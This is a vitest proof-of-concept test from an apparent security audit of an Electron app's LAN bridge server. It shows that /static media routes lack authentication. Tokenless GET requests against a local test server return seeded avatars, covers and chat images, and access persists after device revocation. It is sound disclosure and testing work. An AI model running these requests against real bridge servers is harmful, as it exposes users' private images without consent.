/**
 * PoC — H1: bridge /static mounted at app level WITHOUT requireAuth/originGuard
 * ============================================================================
 * Finding: piolium/findings/H1-bridge-static-unauthenticated-media
 *
 * Chain demonstrated (real application stack; only `electron` is stubbed so the
 * code runs headless — identical to poc-M1/M2):
 *
 *   1. The REAL BridgeServer is started exactly as production does
 *      (bridge/server.ts:28-31): app.use('/api/v1', buildBridgeRouter(...))
 *      then app.use('/static', buildStaticRouter()). The originGuard/requireAuth
 *      middleware live INSIDE buildBridgeRouter only -> /api/v1/* is protected,
 *      /static/* is not.
 *   2. ID leak: a legitimately paired device (real registerDevice/signToken)
 *      fetches GET /api/v1/characters and receives avatarUrl: '/static/avatars/<id>'
 *      (routes.ts:190-218) — the exact IDs the media endpoints need.
 *   3. ATTACKER (any LAN host, NO token): plain HTTP GETs on /static/* return
 *      200 with the full media bytes — character avatar, cover, chat message
 *      image (decoded from base64), group message image.
 *   4. Gate controls: same server returns 401 for /api/v1/* without a token and
 *      ignores the Authorization header on /static/*; after the victim REVOKES
 *      the device, the unauthenticated media fetch still works (revocation does
 *      not revoke media access).
 */
import { describe, expect, it, vi, beforeAll, afterAll } from 'vitest'
import { createServer } from 'node:net'
import { mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

// ---- electron stub: only the userData path is faked (safeStorage unavailable) ----
const mock = vi.hoisted(() => ({ userData: '' }))
vi.mock('electron', () => ({
  app: { getPath: () => mock.userData },
  safeStorage: { isEncryptionAvailable: () => false },
}))
// 公告模块打桩：避免测试访问真实网络（与 routes.test.ts 一致）
vi.mock('../../ipc/announcement', () => ({
  fetchAnnouncementList: vi.fn(async () => ({ items: [], total: 0, page: 1, pageSize: 20 })),
  fetchVersionInfo: vi.fn(async () => ({ version: '0.0.0-poc', changelog: 'poc', downloadUrl: 'https://example.com/x' })),
}))

import { BridgeServer } from '../server'
import { registerDevice, signToken, revokeDevice } from '../auth'
import { DIRS } from '../../services/storage'

// deterministic 1x1 PNG fixtures (different colors so each endpoint's output is distinguishable)
const RED = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGP4z8AAAAMBAQDJ/pLvAAAAAElFTkSuQmCC', 'base64')
const BLUE = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGNgYPgPAAEDAQAIicLsAAAAAElFTkSuQmCC', 'base64')
const GREEN = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGNg+M8AAAICAQB7CYF4AAAAAElFTkSuQmCC', 'base64')
const PURPLE = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGNYoPABAAMUAbHhJTZiAAAAAElFTkSuQmCC', 'base64')

const CHAR_ID = 'char-001'
const SESSION = 'sess-001'
const MSG_ID = 'msg-001'
const GROUP_ID = 'grp-001'
const GSESSION = 'gsess-001'
const GMSG_ID = 'gmsg-001'
const TEST_ROOT = join(tmpdir(), 'qingyu-h1-poc-' + Date.now())

function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = createServer()
    srv.listen(0, '127.0.0.1', () => {
      const addr = srv.address()
      srv.close(() => {
        if (addr && typeof addr === 'object') resolve(addr.port)
        else reject(new Error('no addr'))
      })
    })
    srv.on('error', reject)
  })
}

describe('H1: /static mounted at app level — unauthenticated media read', () => {
  let bridge: BridgeServer
  let base: string
  let deviceId: string

  beforeAll(async () => {
    mock.userData = TEST_ROOT
    // ---- seed production-format data (what the app writes on disk) ----
    mkdirSync(DIRS.characters(), { recursive: true })
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}.png`), RED) // avatar file
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}_cover.png`), BLUE) // cover file
    // 角色卡 metadata：avatar 为 base64 dataURL -> /api/v1/characters 返回 avatarUrl
    writeFileSync(join(DIRS.characters(), `${CHAR_ID}.json`), JSON.stringify({
      id: CHAR_ID, name: '受害角色', description: 'secret-rp-data', personality: '',
      scenario: '', firstMessage: '', exampleDialog: '', tags: [], creator: '',
      createdAt: 0, updatedAt: 0, alternateGreetings: [],
      avatar: 'data:image/png;base64,' + RED.toString('base64'),
    }))
    // 私聊消息 JSONL：images[0] 纯 base64，images[1] dataURL 前缀（static.ts 两条解码分支）
    mkdirSync(join(DIRS.chats(), CHAR_ID), { recursive: true })
    writeFileSync(join(DIRS.chats(), CHAR_ID, `${SESSION}.jsonl`), JSON.stringify({
      id: MSG_ID, sessionId: SESSION, characterId: CHAR_ID, role: 'user',
      content: '用户分享的照片', images: [GREEN.toString('base64'), 'data:image/png;base64,' + PURPLE.toString('base64')],
      isEditing: false, timestamp: 1700000000000,
    }) + '\n')
    // 群聊消息 JSONL
    mkdirSync(join(DIRS.groups(), GROUP_ID), { recursive: true })
    writeFileSync(join(DIRS.groups(), GROUP_ID, `${GSESSION}.jsonl`), JSON.stringify({
      id: GMSG_ID, groupId: GROUP_ID, characterId: '__user__', content: '群聊图片',
      images: [BLUE.toString('base64')], timestamp: 1700000000001, round: 1,
    }) + '\n')

    // ---- start the REAL production bridge server ----
    bridge = new BridgeServer(() => {})
    const handle = await bridge.start({ host: '127.0.0.1', port: await freePort() })
    base = `http://${handle.host}:${handle.port}`
    deviceId = registerDevice('受害者的手机', 'fp-h1-001').deviceId
    console.log(`[H1] bridge server bound: ${base} (BridgeServer.start, mounts identical to server.ts:28-31)`)
  })

  afterAll(() => {
    bridge?.stop()
    rmSync(TEST_ROOT, { recursive: true, force: true })
  })

  it('attacker with NO token reads avatar/cover/chat-image/group-image bytes; /api/v1 stays 401', async () => {
    // ============ 1. ID LEAK via authenticated payload (legit paired device) ============
    const token = signToken(deviceId)
    const charsRes = await fetch(`${base}/api/v1/characters`, { headers: { Authorization: `Bearer ${token}` } })
    expect(charsRes.status).toBe(200)
    const chars = await charsRes.json()
    const leakedAvatarUrl = chars.find((c: { id: string }) => c.id === CHAR_ID)?.avatarUrl
    expect(leakedAvatarUrl).toBe(`/static/avatars/${CHAR_ID}`)
    console.log(`[H1] legit device (Bearer token) sees avatarUrl leaked in /api/v1/characters payload: ${leakedAvatarUrl}`)

    // ============ 2. ATTACKER — plain GET, NO Authorization header ============
    const attempts: Array<[string, string, Buffer]> = [
      ['GET /static/avatars/char-001 (no token)', `${base}/static/avatars/${CHAR_ID}`, RED],
      ['GET /static/covers/char-001 (no token)', `${base}/static/covers/${CHAR_ID}`, BLUE],
      ['GET /static/messages/.../0 (no token, pure b64)', `${base}/static/messages/${CHAR_ID}/${SESSION}/${MSG_ID}/0`, GREEN],
      ['GET /static/messages/.../1 (no token, dataURL)', `${base}/static/messages/${CHAR_ID}/${SESSION}/${MSG_ID}/1`, PURPLE],
      ['GET /static/group-messages/.../0 (no token)', `${base}/static/group-messages/${GROUP_ID}/${GSESSION}/${GMSG_ID}/0`, BLUE],
    ]
    for (const [label, url, expected] of attempts) {
      const res = await fetch(url) // <-- no headers at all
      const got = Buffer.from(await res.arrayBuffer())
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')?.startsWith('image/png')).toBe(true)
      expect(got.equals(expected)).toBe(true)
      console.log(`[H1] ${label} -> HTTP ${res.status} content-type=${res.headers.get('content-type')} bytes=${got.length} (matches seeded image EXACTLY)`)
    }

    // ============ 3. GATE CONTROLS: /api/v1/* IS protected next door ============
    const noAuth = await fetch(`${base}/api/v1/characters`)
    expect(noAuth.status).toBe(401)
    console.log(`[H1] control GET /api/v1/characters (no token) -> ${noAuth.status} (auth enforced on API router)`)

    const badAuth = await fetch(`${base}/api/v1/characters`, { headers: { Authorization: 'Bearer invalid.token.x' } })
    expect(badAuth.status).toBe(401)
    console.log(`[H1] control GET /api/v1/characters (bad token) -> ${badAuth.status}`)

    // Authorization header is simply IGNORED on /static/*
    const staticGarbage = await fetch(`${base}/static/messages/${CHAR_ID}/${SESSION}/${MSG_ID}/0`, {
      headers: { Authorization: 'Bearer invalid.token.x' },
    })
    expect(staticGarbage.status).toBe(200)
    console.log(`[H1] control GET /static/messages with garbage Bearer -> ${staticGarbage.status} (static router never reads Authorization)`)

    // ============ 4. SURVIVES TOKEN REVOCATION ============
    expect(revokeDevice(deviceId)).toBe(true)
    const afterRevoke = await fetch(`${base}/static/messages/${CHAR_ID}/${SESSION}/${MSG_ID}/0`)
    expect(afterRevoke.status).toBe(200)
    console.log(`[H1] after victim revokes device, unauthenticated GET /static/messages/.../0 -> ${afterRevoke.status} (media access survives revocation)`)

    console.log('[H1-RESULT] {"status":"confirmed","evidence":"unauth /static endpoints returned exact chat-image/avatar bytes (HTTP 200, no Authorization); /api/v1 without token -> 401","notes":"ID required is leaked to every paired device via avatarUrl/imageUrl fields and WS broadcasts"}')
  })
})